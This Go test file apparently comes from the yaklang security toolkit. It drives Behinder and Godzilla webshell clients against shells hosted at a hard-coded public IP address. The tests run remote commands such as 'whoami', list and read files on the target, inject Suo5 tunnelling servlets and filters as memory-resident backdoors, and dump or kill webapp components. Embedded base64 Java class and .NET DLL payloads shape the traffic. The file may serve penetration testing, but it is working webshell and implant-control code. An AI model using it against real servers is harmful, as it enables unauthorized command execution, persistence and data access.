package wsm

import (
	"encoding/base64"
	"fmt"
	"github.com/davecgh/go-spew/spew"
	"github.com/stretchr/testify/assert"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"regexp"
	"strings"
	"testing"
)

func TestNewWebJSPShell(t *testing.T) {

	url := "http://47.120.44.219:8080/go0p-json.jsp"
	//testHeaders := map[string]string{
	//	"xxx":  "yyy",
	//	"go0p": "go0p",
	//}
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		//SetHeaders(testHeaders),
		SetShellScript("jsp"),
		SetProxy("http://127.0.0.1:9999"),
	)
	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		jsonStr := `{"go0p":"1",asdfakhj,"body":{"user":"lucky"}}`
		encodedData := base64.StdEncoding.EncodeToString(reqBody)
		//encodedData = strings.ReplaceAll(encodedData, "+", "go0p")
		//encodedData = strings.ReplaceAll(encodedData, "/", "yakit")
		jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
		return []byte(jsonStr), nil
	})
	bx.EchoResultEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		classBase64Str := "yv66vgAAADMANwoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCAAIAQAieyJpZCI6IjEiLCJib2R5Ijp7InVzZXIiOiJsdWNreSJ9fQgACgEABWx1Y2t5CgAMAA0HAA4MAA8AEAEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXRFbmNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyOwoAEgATBwAUDAAVABYBABhqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXIBAA5lbmNvZGVUb1N0cmluZwEAFihbQilMamF2YS9sYW5nL1N0cmluZzsIABgBAAErCAAaAQABPAoAHAAdBwAeDAAfACABABBqYXZhL2xhbmcvU3RyaW5nAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7CAAiAQABLwgAJAEAAT4KABwAJgwAJwAoAQAIZ2V0Qnl0ZXMBAAQoKVtCCQAqACsHACwMAC0ALgEAD0Fzb3V0cHV0UmV2ZXJzZQEAA3JlcwEAAltCAQAFKFtCKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAHdG9CeXRlcwEAClNvdXJjZUZpbGUBABRBc291dHB1dFJldmVyc2UuamF2YQEADElubmVyQ2xhc3NlcwEAB0VuY29kZXIAIQAqAAIAAAABAAAALQAuAAAAAgABAAUALwABADAAAABUAAUAAwAAACwqtwABEgdNLBIJuAALK7YAERIXEhm2ABsSIRIjtgAbtgAbTSostgAltQApsQAAAAEAMQAAABYABQAAAAQABAAFAAcABgAjAAcAKwAIAAEAMgAoAAEAMAAAAB0AAQABAAAABSq0ACmwAAAAAQAxAAAABgABAAAACwACADMAAAACADQANQAAAAoAAQASAAwANgAJ"
		return []byte(classBase64Str), nil
	})
	bx.EchoResultDecodeFormGo(func(rspBody []byte) ([]byte, error) {
		rspBody = rspBody[26 : len(rspBody)-3]
		decodedData, err := base64.StdEncoding.DecodeString(string(rspBody))
		if err != nil {
			return nil, err
		}
		return decodedData, nil
	})
	//ping, err := bx.Ping()
	//if err != nil {
	//	t.Error(err)
	//	return
	//}
	//t.Logf("%v", ping)

	//info, _ := bx.BasicInfo()
	//t.Logf("%v", string(info))

	cmd, err := bx.CommandExec("whoami")
	if err != nil {
		t.Error(err)
		return
	}
	t.Logf("%s", string(cmd))

	//dir, err := bx.listFile("C:\\")
	////ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
	//if err != nil {
	//	t.Error(err)
	//	return
	//}
	//t.Logf("%s", string(dir))
	//
	//x, err := bx.showFile("C:\\Users\\Administrator\\Desktop\\1.txt")
	//
	//if err != nil {
	//	t.Error(err)
	//	return
	//}
	//t.Logf("%s", string(x))
}

func TestNewWebJSPShell_B3(t *testing.T) {

	url := "http://47.120.44.219:8080/bx3.jsp"
	testHeaders := map[string]string{
		"xxx": "yyy",
		//"go0p": "go0p",
	}
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetHeaders(testHeaders),
		SetShellScript("jsp"),
		SetProxy("http://127.0.0.1:9999"),
	)
	ping, err := bx.Ping()
	if err != nil {
		t.Error(err)
		return
	}
	t.Logf("%v", ping)
	info, _ := bx.BasicInfo()
	t.Logf("%v", string(info))
}

func TestNewWebASPXShell(t *testing.T) {

	url := "http://47.120.44.219:8087/decrypt.aspx"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("aspx"),
		SetProxy("http://127.0.0.1:9999"),
	)
	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		jsonStr := `{"go0p":"1",asdfakhj,"body":{"user":"lucky"}}`
		encodedData := base64.StdEncoding.EncodeToString(reqBody)
		encodedData = strings.ReplaceAll(encodedData, "+", "go0p")
		encodedData = strings.ReplaceAll(encodedData, "/", "yakit")
		jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
		return []byte(jsonStr), nil
	})
	bx.EchoResultEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		// Csharp
		classBase64Str := "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"
		return []byte(classBase64Str), nil
	})
	bx.EchoResultDecodeFormGo(func(rspBody []byte) ([]byte, error) {
		decodedData := utils.StringReverse(string(rspBody))
		return []byte(decodedData), nil
	})
	ping, err := bx.Ping()
	//ping, err := bx.showFile("C:\\Vuln\\apache-tomcat-8.5.84\\webapps\\S2-032")
	if err != nil {
		t.Error(err)
		return
	}
	t.Logf("%v", ping)
}

func TestNewWebPHPShell(t *testing.T) {

	url := "http://47.120.44.219/bx4-bs64.php"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("php"),
		SetProxy("http://127.0.0.1:9999"),
	)
	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		jsonStr := `{"go0p":"1",asdfakhj,"body":{"user":"lucky"}}`
		encodedData := base64.StdEncoding.EncodeToString(reqBody)
		encodedData = strings.ReplaceAll(encodedData, "+", "go0p")
		encodedData = strings.ReplaceAll(encodedData, "/", "yakit")
		jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
		return []byte(jsonStr), nil
	})
	bx.EchoResultEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		classBase64Str := `
function encrypt($data){
    return base64_encode($data);
}
`
		return []byte(classBase64Str), nil
	})
	bx.EchoResultDecodeFormGo(func(rspBody []byte) ([]byte, error) {
		decodedData, err := base64.StdEncoding.DecodeString(string(rspBody))
		if err != nil {
			return nil, err
		}
		return decodedData, nil
	})
	//ping, err := bx.Ping()
	////ping, err := bx.listFile("C:/")
	//if err != nil {
	//	t.Error(err)
	//	return
	//}
	//t.Logf("%v", (ping))
	cmd, err := bx.CommandExec("whoami")
	//ping, err := bx.listFile("C:/")
	if err != nil {
		t.Error(err)
		return
	}
	t.Logf("%v", string(cmd))
}

func TestNewWebPHPShell_PPT(t *testing.T) {

	url := "http://47.120.44.219/echo.php"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("php"),
		SetProxy("http://127.0.0.1:9999"),
	)
	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		enc := "aaa" + string(reqBody) + "bbb"
		return []byte(enc), nil
	})
	bx.EchoResultEncodeFormGo(func(reqBody []byte) ([]byte, error) {
		classBase64Str := `
function encrypt($data){
    return strrev($data);
}
`
		return []byte(classBase64Str), nil
	})
	bx.EchoResultDecodeFormGo(func(rspBody []byte) ([]byte, error) {
		// 字符串反转
		de := utils.StringReverse(string(rspBody))

		return []byte(de), nil
	})
	ping, err := bx.Ping()
	//ping, err := bx.listFile("C:/")
	if err != nil {
		t.Error(err)
		return
	}
	t.Logf("%v", (ping))
	//cmd, err := bx.CommandExec("whoami")
	////ping, err := bx.listFile("C:/")
	//if err != nil {
	//	t.Error(err)
	//	return
	//}
	//t.Logf("%v", string(cmd))
}

func TestNewWebPHPShell_B3(t *testing.T) {

	url := "http://47.120.44.219/bx3.php"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("php"),
		SetProxy("http://127.0.0.1:9999"),
	)

	cmd, err := bx.CommandExec("whoami")
	//ping, err := bx.listFile("C:/")
	if err != nil {
		t.Error(err)
		return
	}
	t.Logf("%v", string(cmd))
}

func TestNewWebASPShell_B3(t *testing.T) {
	url := "http://47.120.44.219:8087/bx.asp"
	bx, _ := NewBehinderManager(url,
		SetSecretKey("rebeyond"),
		SetShellScript("asp"),
		SetProxy("http://127.0.0.1:9999"),
	)
	//ping, err := bx.Ping()
	//if err != nil {
	//	t.Error(err)
	//	return
	//}
	//t.Logf("%v", ping)
	//
	//info, _ := bx.BasicInfo()
	//t.Logf("%v", string(info))

	//cmd, _ := bx.CommandExec("whoami")
	//t.Logf("%v", string(cmd))

	dir, _ := bx.listFile("C:\\")
	t.Logf("%v", string(dir))
}

func TestNewGodzillaBase64Jsp(t *testing.T) {
	url := "http://47.120.44.219:8080/bs64.jsp"

	gs, err := NewGodzillaManager(
		url,
		SetSecretKey("key"),
		SetPass("pass"),
		SetShellScript("jsp"),
		SetBase64Aes(),
		SetProxy("http://127.0.0.1:9999"),
	)
	if err != nil {
		panic(err)
	}

	ping, err := gs.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	//info, err := gs.BasicInfo()
	//if err != nil {
	//	panic(err)
	//}
	//fmt.Println(string(info))
}

func TestNewGodzillaRawJsp(t *testing.T) {
	url := "http://47.120.44.219:8080/raw.jsp"

	gs, err := NewGodzillaManager(
		url,
		SetSecretKey("key"),
		SetPass("pass"),
		SetShellScript("jsp"),
		SetRawAes(),
		SetProxy("http://127.0.0.1:9999"),
	)
	if err != nil {
		panic(err)
	}

	info, err := gs.BasicInfo()
	if err != nil {
		panic(err)
	}
	fmt.Println(string(info))
}

func TestInjectSuo5Servlet(t *testing.T) {
	url := "http://47.120.44.219:8080/bs64.jsp"
	godzillaShell, _ := NewWebShell(
		url,
		SetGodzillaTool(),
		SetPass("pass"), SetSecretKey("key"),
		SetShellScript("jsp"),
		SetBase64Aes(),
		SetProxy("http://127.0.0.1:9999"),
	)
	g := godzillaShell.(*Godzilla)
	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)
	list, err := g.getFile("C:/phpstudy_prox")
	//plugin, err := g.LoadSuo5Plugin("go0p", "servlet", "/suo5")
	if err != nil {
		panic(err)
	}
	//
	fmt.Println(string(list))

}

func TestInjectSuo5Filter(t *testing.T) {
	url := "http://47.120.44.219:8080/bs64.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)

	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := g.LoadSuo5Plugin("go0p", "filter", "/*")
	if err != nil {
		panic(err)
	}

	spew.Dump(plugin)
}

func TestInjectWebappComponent(t *testing.T) {
	url := "http://127.0.0.1:8080/tomcatLearn_war_exploded/shell.jsp"
	godzillaShell, _ := NewWebShell(url, SetGodzillaTool(), SetPass("pass"), SetSecretKey("key"), SetShellScript("jsp"), SetBase64Aes())
	g := godzillaShell.(*Godzilla)
	err := g.InjectPayload()
	if err != nil {
		panic(err)
	}
	ping, err := godzillaShell.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println(ping)

	plugin, err := g.LoadScanWebappComponentInfoPlugin("memshellScan")
	if err != nil {
		panic(err)
	}

	plugin, err = g.ScanWebappComponentInfo()
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "b3JnLmFwYWNoZS5qYXNwZXIuc2VydmxldC5Kc3BTZXJ2bGV0"))

	plugin, err = g.DumpWebappComponent("com.example.HelloServlet")
	pattern := regexp.MustCompile(`"classBytes":\s*"([^"]+)"`)
	plugin = pattern.FindSubmatch(plugin)[1]
	if err != nil {
		panic(err)
	}

	plugin, _ = codec.DecodeBase64(string(plugin))
	plugin = []byte(codec.EncodeToHex(plugin))

	spew.Dump(plugin)

	assert.True(t, strings.Contains(string(plugin), "cafebabe"))

	plugin, err = g.KillWebappComponent("filter", "HelloFilter")
	if err != nil {
		panic(err)
	}
	spew.Dump(plugin)
	assert.True(t, strings.Contains(string(plugin), "success"))

}
